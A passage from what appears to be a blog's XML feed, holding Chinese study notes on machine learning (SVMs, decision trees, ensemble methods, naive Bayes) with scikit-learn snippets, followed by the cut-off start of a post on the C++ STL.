class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line">svm_clf = LinearSVC(C=<span class="number">1</span>, loss=<span class="string">&quot;hinge&quot;</span>, dual=<span class="literal">False</span>, random_state=<span class="number">42</span>)</span><br><span class="line"><span class="comment"># C越大，越接近硬间隔；使用hinge损失函数，随机种子为42</span></span><br><span class="line"><span class="comment"># svm_clf = Pipeline([(&quot;scaler&quot;, StandardScaler()), (&quot;linear_svc&quot;, LinearSVC(C=1, loss=&quot;hinge&quot;, random_state=42)), ])</span></span><br></pre></td></tr></table></figure><p><strong>SVC类</strong>可以使用核函数（后面会讲到），适用于<u>样本数量较少</u>的二元和多元分类（少于10000）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)   <span class="comment"># 使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>SGDClassifier类</strong>它不会像LinearSVC类那样快速收敛，但是对于内存处理不了的大型数据集（核外训练）或是在线分类任务，它非常有效。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDClassifier</span><br><span class="line"><span class="comment"># SGD模型，使用hinge损失函数，alpha为正则化项参数</span></span><br><span class="line">svm_clf = SGDClassifier(loss=<span class="string">&quot;hinge&quot;</span>, alpha=<span class="number">1</span>/(m*C))</span><br></pre></td></tr></table></figure><h4 id="2-非线性SVM分类"><a href="#2-非线性SVM分类" class="headerlink" title="2. 非线性SVM分类"></a>2. 非线性SVM分类</h4><p>有些情况下，数据集无法直接做到线性可分，解决方法之一就是添加更多的特征，将原始数据映射到更高维的空间，使其变得线性可分。</p><p><u><em><strong>核函数：</strong></em></u></p><p>添加特征会使得在高维空间计算样本特征内积变得困难，为了避开这个障碍，可以设想一个函数，使样本在高维特征空间的内积等于它们在原始样本空间中通过该函数计算的结果。使用该函数的就可以替代在高维甚至无穷维特征空间中的内积。这个函数就叫做”核函数“。</p><p><strong>线性核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svm_clf = SVC(kernel=<span class="string">&quot;linear&quot;</span>, C=<span class="number">1</span>)    <span class="comment"># SVC模型，使用线性核函数</span></span><br></pre></td></tr></table></figure><p><strong>多项式核：</strong></p><p>为了将数据集映射到高维特征空间，可以使用PolynomialFeatures转换器直接添加多项式特征。但问题是，如果多项式太低阶，处理不了非常复杂的数据集，而高阶则会创造出大量的特征，导致模型变得太慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polynomial_svm_clf = Pipeline([(<span class="string">&quot;poly_features&quot;</span>, PolynomialFeatures(degree=<span class="number">3</span>)), (<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, LinearSVC(C=<span class="number">10</span>, loss=<span class="string">&quot;hinge&quot;</span>, random_state=<span class="number">42</span>))])</span><br></pre></td></tr></table></figure><p>为了解决这个问题，出现了多项式核函数。下面这段代码使用了一个3阶多项式内核训练SVM分类器。超参数coef0控制的是模型受高阶多项式还是低阶多项式影响的程度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poly_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()), (<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">3</span>, coef0=<span class="number">1</span>, C=<span class="number">5</span>))])</span><br><span class="line">poly_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p><strong>高斯核：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用RBF高斯核函数</span></span><br><span class="line">rbf_kernel_svm_clf = Pipeline([(<span class="string">&quot;scaler&quot;</span>, StandardScaler()),(<span class="string">&quot;svm_clf&quot;</span>, SVC(kernel=<span class="string">&quot;rbf&quot;</span>, gamma=<span class="number">5</span>, C=<span class="number">0.001</span>))])</span><br><span class="line">rbf_kernel_svm_clf.fit(X, y)</span><br></pre></td></tr></table></figure><p>另外，还有拉普拉斯核、Sigmoid核。</p><p><strong><u><em>如何选择核函数：</em></u></strong></p><p>有一个经验法则是，永远先<u>从线性核函数开始</u>尝试（要记住，LinearSVC比SVC（kernel&#x3D;”linear”）快得多），特别是训练集非常大或特征非常多的时候。如果训练集不太大，你可以试试<u>高斯RBF核</u>，大多数情况下它都非常好用。如果你还有多余的时间和计算能力，你可以使用<u>交叉验证和网格搜索</u>来尝试一些其他的核函数，特别是那些专门针对你的数据集数据结构的核函数。</p><h4 id="3-SVM回归-SVR"><a href="#3-SVM回归-SVR" class="headerlink" title="3. SVM回归(SVR)"></a>3. SVM回归(SVR)</h4><p>SVM算法非常全面：它不仅支持线性和非线性分类，而且还支持线性和非线性回归。SVM回归要做的是让尽可能多的实例位于街道上，同时限制间隔违例（也就是不在街道上的实例）。</p><p>街道的宽度由超参数ε控制。在间隔内添加更多的实例不会影响模型的预测，所以这个模型被<br>称为ε不敏感。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210427095934141.png" alt="image-20210427095934141" style="zoom: 80%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SVM回归</span></span><br><span class="line">svm_reg = LinearSVR(epsilon=<span class="number">1.5</span>)</span><br><span class="line">svm_reg.fit(X, y)</span><br></pre></td></tr></table></figure><p>要解决非线性回归任务，可以使用核化的SVM模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用核化的SVM模型进行回归</span></span><br><span class="line">svm_poly_reg = SVR(kernel=<span class="string">&quot;poly&quot;</span>, degree=<span class="number">2</span>, C=<span class="number">100</span>, epsilon=<span class="number">0.1</span>)</span><br><span class="line">svm_poly_reg.fit(X, y)</span><br></pre></td></tr></table></figure><h2 id="第四章-决策树DT"><a href="#第四章-决策树DT" class="headerlink" title="第四章 决策树DT"></a>第四章 决策树DT</h2><p>决策树是一种由结点和有向边构成的树形结构，结点类型分为内部结点和叶结点，每个内部结点代表对象的一个特征，叶结点则代表对象的类别。决策树中，每一个深度就是一次根据某一特征做出的判断。决策树的特质之一就是它们需要的数据准备工作非常少。特别是，完全不需要进行特征缩放或集中。</p><p>鸢尾花决策树：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210430093007719.png" alt="image-20210430093007719" style="zoom: 80%;"><p>节点的samples属性统计它应用的训练实例数量（满足该节点属性的实例数量），value属性说明了该节点上每个类别的训练实例数量，gini属性衡量其不纯度（impurity，基尼不纯度）：如果应用的所有训练实例都属于同一个类别，那么节点就是“纯”的（gini&#x3D;0）。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150650767.png" alt="image-20210423150650767" style="zoom: 50%;"><p>$P_{i,k}$是第$i$个节点上，类别为$k$的训练实例占比。</p><p>Scikit-Learn使用的是CART算法（Classification And Regression Tree），该算法仅生成二叉树，可用于分类和回归，使用：基尼不纯度来划分属性。但是，其他算法，比如ID3生成的决策树，其节点可以拥有两个以上的子节点，使用信息增益来划分属性。</p><h3 id="一、CART算法"><a href="#一、CART算法" class="headerlink" title="一、CART算法"></a>一、CART算法</h3><h4 id="1-CART算法（分类）"><a href="#1-CART算法（分类）" class="headerlink" title="1. CART算法（分类）"></a>1. CART算法（分类）</h4><p><strong><u><em>过程如下：</em></u></strong></p><p>（1）使用单个特征k和阈值tk（例如，花瓣长度≤2.45厘米）将训练集分成两个子集。k和tk就是使得成本函数$J$最小化（或者信息增益最大化）的$(k,t_k)$，成本函数衡量划分后的子集的不纯度。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423150441237.png" alt="image-20210423150441237" style="zoom:50%;"><p>（2）一旦成功将训练集一分为二，它将使用相同的逻辑，继续分裂子集，然后是子集的子集，依次循环递进。</p><p>（3）抵达最大深度（由超参数max_depth控制），或是再也找不到能够降低不纯度的分裂时，停止。</p><p>明显，决策树的思想是一种贪心选择，它并不会检视一次分裂的不纯度是否为可能的最低值，这样通常可以产生一个相当不错的解，但是不能保证是最优解。而寻找最优树是一个NP完全问题，即使训练集很小时间复杂度也很高，很难解决，所以我们必须接受这个”相当不错“的解。</p><p><em><strong><u>计算复杂度：</u></strong></em></p><p>决策树总体预测复杂度是O(log2(m))，m为实例数量，可以看出复杂度与特征数量无关，所以即便是处理大型数据集，预测也很快。</p><p>但是，训练时在每一个节点，算法都需要在所有样本上比较所有特征（如果设置了划分时考虑的最大特征数<strong>max_features</strong>会少一些）。这导致训练的复杂度为O(n×m log(m))，。对于小型训练集（几千个实例以内），Scikit-Learn可以通过对数据预处理（设置<strong>presort&#x3D;True</strong>表示对样本进行预排序）来加快训练，但是对于较大训练集而言，可能会减慢训练的速度。</p><p><strong><u><em>过拟合与正则化超参数：</em></u></strong></p><p>决策树在训练时不会确定参数的数量（树的深度不确定），也叫非参数模型，这会导致模型结构自由而紧密地贴近数据，很可能过拟合。而比如线性回归有预先设定好一部分参数，所以其自由度受限，降低过拟合的风险（但是相应的也增加了拟合不足的风险）。</p><p>为了避免过拟合，需要在训练中降低决策树的自由度，即正则化。正则化超参数的选择取决于使用的模型，但是通常至少可以限制决策树的深度。在Scikit-Learn中，这由超参数<strong>max_depth</strong>控制（默认值为None，意味着无限制）。减小max_depth可使模型正则化，从而降低过度拟合的风险。另外，DecisionTreeClassifier类还有一些其他的参数也可以限制决策树的形状，比如<strong>min_samples_split</strong>（分裂前节点必须有的最小样本<br>数），<strong>min_samples_leaf</strong>（叶节点必须有的最小样本数量）等。</p><p>还可以先不加约束地训练模型，然后再对不必要的节点进行剪枝（删除），比如一个节点的子节点全部为叶节点，则该节点可被认为不必要，删除；比如χ2测试，是用来估算“提升纯粹是出于偶然”（被称为虚假设）的概率。如果这个概率（称之为p值）高于一个给定阈值（通常是5%，由超参数控制），那么这个节点可被认为不必要，其子节点可被删除。</p><h4 id="2-CART算法（回归）"><a href="#2-CART算法（回归）" class="headerlink" title="2. CART算法（回归）"></a>2. CART算法（回归）</h4><p>决策树也可以用来完成回归任务，用Scikit_Learn的DecisionTreeRegressor来构建一个回归树。</p><p>与分类决策树的主要差别在于，每个节点上不再是预测一个类别而是预测一个值。预测结果就是与最后到达的叶节点关联的110个实例的平均目标值。MSE表示在这个叶节点上得到的预测结果的均方误差。</p><p>回归任务中，CART算法的工作原理跟前面介绍的大致相同，唯一不同在于，它分裂训练集的方式不是最小化不纯度，而是最小化MSE。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210423192435313.png" alt="image-20210423192435313"></p><p>同样，用于回归的决策树也会有过拟合的可能，所以需要设置min_samples_leaf。</p><h4 id="3-优缺点"><a href="#3-优缺点" class="headerlink" title="3. 优缺点"></a>3. 优缺点</h4><p>决策树使用简单，不受特征数量的限制，但是青睐正交的决策边界（所有的分裂都与轴线垂直），这导致它们对训练集的旋转非常敏感，可能导致泛化不佳，限制这种问题的方法之一是使用PCA，让训练数据定位在一个更好的方向上。更概括地说，决策树的主要问题是它们对训练数据中的小变化非常敏感。</p><h3 id="二、ID3算法"><a href="#二、ID3算法" class="headerlink" title="二、ID3算法"></a>二、ID3算法</h3><h3 id="三、C4-5算法（J48）"><a href="#三、C4-5算法（J48）" class="headerlink" title="三、C4.5算法（J48）"></a>三、C4.5算法（J48）</h3><p>使用信息增益选择特征</p><h2 id="第五章-集成学习与随机森林"><a href="#第五章-集成学习与随机森林" class="headerlink" title="第五章 集成学习与随机森林"></a>第五章 集成学习与随机森林</h2><h3 id="一、模型融合"><a href="#一、模型融合" class="headerlink" title="一、模型融合"></a>一、模型融合</h3><h4 id="1-投票分类器"><a href="#1-投票分类器" class="headerlink" title="1. 投票分类器"></a>1. 投票分类器</h4><p>不同的算法在相同训练集上进行训练，得到多个预测模型，然后基于多个模型的预测结果投票选出最终结果。</p><p><strong><u><em>硬投票法：</em></u></strong></p><p>直接让各个预测模型给出预测结果（投票），然后选择大多数模型投票的类别作为最终预测结果。</p><p><strong><u><em>软投票法：</em></u></strong></p><p>模型估算出类别的概率（predict_proba()），将概率在所有单个分类器上（加权）平均，选出平均概率最高的类别进行预测。软投票法比硬投票的表现更优，因为它基于哪些高度自信的投票更高的权重。</p><h4 id="2-bagging-和-pasting"><a href="#2-bagging-和-pasting" class="headerlink" title="2. bagging 和 pasting"></a>2. bagging 和 pasting</h4><p>对训练集随机采样，使用相同的算法在不同的训练子集上进行训练。采样时如果<u>将样本放回</u>，这种方法叫<u>bagging</u>，<u>不放回叫pasting</u>。（bootstrap&#x3D;True表示bagging，否则表示pasting）</p><p>一旦预测器训练完成，集成就可以通过简单地聚合所有预测器的预测，来对新实例做出预测。聚合函数通常是统计法（即最多数的预测好比硬投票分类器一样）用于分类，或是平均法用于回归。最终结果是，与直接在原始训练集上训练的单个预测器相比，集成方法的单个预测器的偏差更大，但是最终结果的偏差相近，方差更低。</p><p><strong><u><em>包外评估：</em></u></strong></p><p>使用bagging时，有些样本可能会被多次采样，有些样本可能不会被采样。不划分单独的测试集，而直接将那些未被采样的样本作为测试集，就是包外评估。</p><h4 id="3-stacking"><a href="#3-stacking" class="headerlink" title="3. stacking"></a>3. stacking</h4><p>第一层：将数据分为训练集和测试集，训练集再分为2个子集。首先在子集1上训练不同的模型：</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160136685.png" alt="image-20210428160136685" style="zoom: 67%;"><p>第二层：分别使用前面训练好的几个模型对子集2进行预测，得到多个预测值。接着，使用这些预测值作为输入特征，创建一个新的训练集，并保留真实标签。在这个新的训练集上训练混合器，让它学习根据第一层的预测来在测试集上预测目标值。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160307753.png" alt="image-20210428160307753"></p><p>当然，这个模型还可以增加层数，增加的层都是使用上一层的预测值作为输入特征来训练模型。</p><p>比如下面是一个三层的stacking模型：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428160815773.png" alt="image-20210428160815773"></p><p>将训练集分为3个子集。第一层使用子集1进行模型的训练，得到3个模型。第二层中，使用第一层的模型在子集2上的预测作为输入特征来训练三个新的模型。第三层中，使用第二层的模型在子集3上的预测作为输入特征来训练最终模型。最后使用最终模型在测试集上进行预测。</p><p>不幸的是，Scikit-Learn不直接支持堆叠，但是自己堆出stacking的实现并不太难。或者也可以使用开源的实现方案，例如brew（可从<a href="https://github.com/viisar/brew%E8%8E%B7%E5%BE%97%EF%BC%89%E3%80%82">https://github.com/viisar/brew获得）。</a></p><h3 id="二、随机森林RF"><a href="#二、随机森林RF" class="headerlink" title="二、随机森林RF"></a>二、随机森林RF</h3><p>随机森林就是决策树的集成，通常采用bagging集成方法（有时也可以是pasting）。</p><p>训练子集的大小通过max_samples来设置。在sklearn中，除了先构建一个BaggingClassifier然后将结果传输到DecisionTreeClassifier，还有一种方法就是直接使用RandomForestClassifier或者RandomForestRegressor类。</p><p>随机森林在树的生长上引入了更多的随机性：分裂节点时不再是搜索最好的特征，而是在一个随机生成的特征子集里搜索最好的特征。这导致决策树具有更大的多样性，用更高的偏差换取更低的方差，总之，还是产生了一个整体性能更优的模型。</p><h3 id="三、提升法boosting"><a href="#三、提升法boosting" class="headerlink" title="三、提升法boosting"></a>三、提升法boosting</h3><p>提升法（Boosting，最初被称为假设提升）是指可以将几个弱学习器结合成一个强学习器的任意集成方法。大多数提升法的总体思路是<u>循环训练预测器</u>，每一次都对其前序做出一些改正。</p><h4 id="1-AdaBoost"><a href="#1-AdaBoost" class="headerlink" title="1. AdaBoost"></a>1. AdaBoost</h4><p>新预测器对其前序进行纠正的办法之一，就是更多地关注前序拟合不足的训练实例。从而使新的预测器不断地越来越专注于难缠的问题，这就是AdaBoost使用的技术。</p><p><u><em><strong>过程如下：</strong></em></u></p><p>（1）训练一个基础分类器（比如决策树），用它对训练集进行预测。</p><p>（2）然后对错误分类的训练实例增加其相对权重</p><p>（3）使用这个最新的权重对第二个分类器进行训练，然后再次对训练集进行预测</p><p>（4）继续对错误分类的训练实例增加其权重，如此循环</p><p>（5）当到达所需数量的预测器，或得到完美的预测器时，算法停止</p><p>（6）这样就得到若干个预测器，再使用bagging或pasting等集成方法得到最终预测结果</p><p><u><em><strong>优缺点：</strong></em></u></p><p>AdaBoost不再是调整单个预测器的参数使损失函数最小化，而是不断在集成中加入预测器，使模型越来越好。而且每次训练是基于加权的训练集。</p><p>这种依序学习技术有一个重要的缺陷就是无法并行（哪怕只是一部分），因为每个预测器只能在前一个预测器训练完成并评估之后才能开始训练，在这一点上AdaBoost的表现不及bagging和pasting方法。</p><p><u><em><strong>权重：</strong></em></u></p><p>AdaBoost中，每个预测器有一个权重，通过其加权误差率、学习率计算而来，预测器的准确率越高，其权重就越高。同时，每个样本实例也有权重。最开始每个实例的权重都一样，一个预测器预测完成后，会对实例的权重进行更新，也就是提升被错误分类的实例的权重。</p><p><u><em><strong>使用：</strong></em></u></p><p>Scikit-Learn使用的其实是AdaBoost的一个多分类版本，叫作SAMME（<a href="http://goo.gl/Eji2vR%EF%BC%89[4]%EF%BC%88%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%B1%BB%E6%8C%87%E6%95%B0%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%90%E6%AD%A5%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9E%8B%EF%BC%89%E3%80%82%E5%BD%93%E5%8F%AA%E6%9C%89%E4%B8%A4%E4%B8%AA%E7%B1%BB%E5%88%AB%E6%97%B6%EF%BC%8CSAMME%E5%8D%B3%E7%AD%89%E5%90%8C%E4%BA%8EAdaBoost%E3%80%82%E6%AD%A4%E5%A4%96%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%A2%84%E6%B5%8B%E5%99%A8%E5%8F%AF%E4%BB%A5%E4%BC%B0%E7%AE%97%E7%B1%BB%E5%88%AB%E6%A6%82%E7%8E%87%EF%BC%88%E5%8D%B3%E5%85%B7%E6%9C%89predict_proba%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%EF%BC%89%EF%BC%8CScikit-Learn%E4%BC%9A%E4%BD%BF%E7%94%A8%E4%B8%80%E7%A7%8DSAMME%E7%9A%84%E5%8F%98%E4%BD%93%EF%BC%8C%E7%A7%B0%E4%B8%BASAMME.R%EF%BC%88R%E4%BB%A3%E8%A1%A8">http://goo.gl/Eji2vR）[4]（基于多类指数损失函数的逐步添加模型）。当只有两个类别时，SAMME即等同于AdaBoost。此外，如果预测器可以估算类别概率（即具有predict_proba（）方法），Scikit-Learn会使用一种SAMME的变体，称为SAMME.R（R代表</a> “Real”,它依赖的是类别概率而不是类别预测，通常表现更好。</p><h4 id="2-梯度提升"><a href="#2-梯度提升" class="headerlink" title="2. 梯度提升"></a>2. 梯度提升</h4><p>GBDT</p><h3 id="四、XGBoost"><a href="#四、XGBoost" class="headerlink" title="四、XGBoost"></a>四、XGBoost</h3><h2 id="第六章-贝叶斯分类器"><a href="#第六章-贝叶斯分类器" class="headerlink" title="第六章 贝叶斯分类器"></a>第六章 贝叶斯分类器</h2><p>贝叶斯分类是一类分类算法的总称，这类算法均以贝叶斯定理为基础，故统称为贝叶斯分类。而朴素朴素贝叶斯分类是贝叶斯分类中最简单，也是常见的一种分类方法。</p><h3 id="一、贝叶斯公式："><a href="#一、贝叶斯公式：" class="headerlink" title="一、贝叶斯公式："></a>一、贝叶斯公式：</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428101924523.png" alt="image-20210428101924523"></p><p><u><em><strong>原理：</strong></em></u></p><p>X：特征向量；Y：类别<br><strong>先验概率</strong>P(X)：指根据以往经验和分析得到的概率。<br><strong>后验概率</strong>P(Y|X)：事情已经发生，要求这件事情发生的原因是由某个因素引起的可能性的大小。<br><strong>类条件概率</strong>P(X|Y)：在已知某类别的特征空间中，出现特征值X的概率密度。</p><p>如果需要选出某样本属于哪类，则需要根据该条样本求出它属于每个类的概率，选择最大概率的那个类作为分类结果。</p><p>由于结果的产生是比较属于各个类别的概率，所以计算的概率的分母都是P(X)，可以忽略掉P(X)。同时P(Y)容易求出，那么我们关注P(X|Y)。朴素贝叶斯之所以朴素是因为它<u>假设X的每个特征都是独立的</u>，回归原始。故而P(X|Y)的概率就可以计算为：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102705885.png" alt="image-20210428102705885"></p><p>故，朴素贝叶斯公式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428102729512.png" alt="image-20210428102729512"></p><h3 id="二、朴素贝叶斯模型："><a href="#二、朴素贝叶斯模型：" class="headerlink" title="二、朴素贝叶斯模型："></a>二、朴素贝叶斯模型：</h3><h4 id="1-多项式模型："><a href="#1-多项式模型：" class="headerlink" title="1. 多项式模型："></a>1. 多项式模型：</h4><p>多项式模型在计算先验概率P(Yk)和条件概率P(xi|Yk)时，会做一些平滑处理，具体公式为：<br>$$<br>P(Y_k) &#x3D; \frac{N_{Y_k}+\alpha}{N+K\alpha}<br>$$</p><p>$N_{Y_k}$：类别为$Y_k$的样本数</p><p>N：总样本数</p><p>K：总的类别个数</p><p>$\alpha$：平滑值</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428110956018.png" alt="image-20210428110956018"></p><p>$N_{Y_k,x_i}$：类别为$Y_k$，且特征为$x_i$的样本数</p><p>n：特征$x_i$可以选择的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多项式朴素贝叶斯，alpha为平滑参数，默认为1</span></span><br><span class="line"><span class="comment"># class_prior为类先验概率，若指定了该参数，就按指定的参数计算。class_log_prior_取值就是class_prior转换成log后的结果（防止下溢出）</span></span><br><span class="line"><span class="comment"># fit_prior默认为True，表示是否学习先验概率，为False时表示所有类标记具有相同的先验概率（等于类标记总个数N分之一）</span></span><br><span class="line">pnb_clf = MultinomialNB(alpha=<span class="number">2.0</span>, class_prior=<span class="literal">None</span>, fit_prior=<span class="literal">True</span>)</span><br><span class="line">pnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(pnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="2-高斯模型："><a href="#2-高斯模型：" class="headerlink" title="2. 高斯模型："></a>2. 高斯模型：</h4><p>当特征是连续变量的时候，假设特征分布为正太分布，根据样本算出均值和方差，再求得概率。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111749260.png" alt="image-20210428111749260"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 高斯朴素贝叶斯</span></span><br><span class="line"><span class="comment"># 参数priors默认为None，指各个类标记对应的先验概率</span></span><br><span class="line">gnb_clf = GaussianNB()</span><br><span class="line">gnb_clf.fit(X,y)    <span class="comment"># partial_fit表示增量学习</span></span><br><span class="line"><span class="built_in">print</span>(gnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><h4 id="3-伯努利模型："><a href="#3-伯努利模型：" class="headerlink" title="3. 伯努利模型："></a>3. 伯努利模型：</h4><p>伯努利模型适用于离散特征的情况，每个特征的取值只能是1和0。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20210428111837792.png" alt="image-20210428111837792"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伯努利朴素贝叶斯（每个特征的取值只能是1和0）</span></span><br><span class="line"><span class="comment"># 参数binarize指将数据特征二值化的阈值</span></span><br><span class="line">bnb_clf = BernoulliNB(alpha=<span class="number">2.0</span>,binarize = <span class="number">3.0</span>,fit_prior=<span class="literal">True</span>)</span><br><span class="line">bnb_clf.fit(X,y)</span><br><span class="line"><span class="built_in">print</span>(bnb_clf.predict([[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>]]))</span><br></pre></td></tr></table></figure><p><u><em><strong>算法流程：</strong></em></u></p><ol><li><p>处理数据，得到m个具有n个特征的样本，这些样本分别属于${Y_1,Y_2,Y_3}$类别。</p></li><li><p>通过数据分析可以得到每个特征的类条件概率$P(x_i|Y)$，再通过全概率公式求得$P(X)$。</p></li></ol><p>  $P(X)&#x3D;P(X|Y_1)P(Y_1)+P(X|Y_2)P(Y_2)+P(X|Y_3)P(Y_3)$</p><ol start="3"><li><p>其中$P(X|Y_i)$可根据特征独立性展开。</p></li><li><p>将求得的先验概率和类条件概率带入朴素贝叶斯公式，求得每个类别的后验概率。我们可以选择概率最大的类别为最后确定的类别.</p></li></ol><h2 id="第七章-神经网络"><a href="#第七章-神经网络" class="headerlink" title="第七章 神经网络"></a>第七章 神经网络</h2><h2 id="第八章-聚类"><a href="#第八章-聚类" class="headerlink" title="第八章 聚类"></a>第八章 聚类</h2><p>K-means</p><h1 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h1><p>《机器学习实战》目录：</p><p>1~7为分类算法，8~9为回归算法，10~12为无监督算法</p><ol><li>ML基础</li><li>KNN</li><li>DT</li><li>NB（概率分布）</li><li>LR（算法优化，处理数据集合中的缺失值）</li><li>SVM</li><li>AdaBoost</li><li>回归、去噪、局部线性回归</li><li>CART（回归部分）</li><li>k-means</li><li>Apriori</li><li>FP-Growth</li><li><ol start="14"><li>主成分分析、奇异值分解、MapReduce</li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;机器学习实战&quot;&gt;&lt;a href=&quot;#机器学习实战&quot; class=&quot;headerlink&quot; title=&quot;机器学习实战&quot;&gt;&lt;/a&gt;机器学习实战&lt;/h1&gt;&lt;p&gt;参考书目：&lt;/p&gt;
&lt;p&gt;《机器学习实战：基于Scikit-Learn和TensorFlow》&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="机器学习" scheme="https://frankcao3.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>STL</title>
    <link href="https://frankcao3.github.io/posts/9423"/>
    <id>https://frankcao3.github.io/posts/9423</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><p>参考链接：</p><p><a href="http://c.biancheng.net/stl/">http://c.biancheng.net/stl/</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>STL，英文全称 standard template library，中文可译为标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入&#x2F;输出、数学计算等功能。</p><p>STL 最初由惠普实验室开发，于 1998 年被定为国际标准，正式成为 C++ 程序库的重要组成部分。值得一提的是，如今 STL 已完全被内置到支持 C++ 的编译器中，无需额外安装，这可能也是 STL 被广泛使用的原因之一。</p><p>STL 就位于各个 C++ 的头文件中，即它并非以二进制代码的形式提供，而是以源代码的形式提供。</p><p>从根本上说，STL 是一些容器、算法和其他一些组件的集合，所有容器和算法都是总结了几十年来算法和数据结构的研究成果，汇集了许多计算机专家学者经验的基础上实现的，因此可以说，STL 基本上达到了各种存储方法和相关算法的高度优化。</p><p><strong>注意，这里提到的容器，本质上就是封装有数据结构的模板类，例如 list、vector、set、map 等</strong></p><p>STL的头文件：algorithm，numeric，vector，deque，list，queue，stack，set，map，iterator，memory，utility</p><h2 id="1-Algorithm"><a href="#1-Algorithm" class="headerlink" title="1. Algorithm"></a>1. Algorithm</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 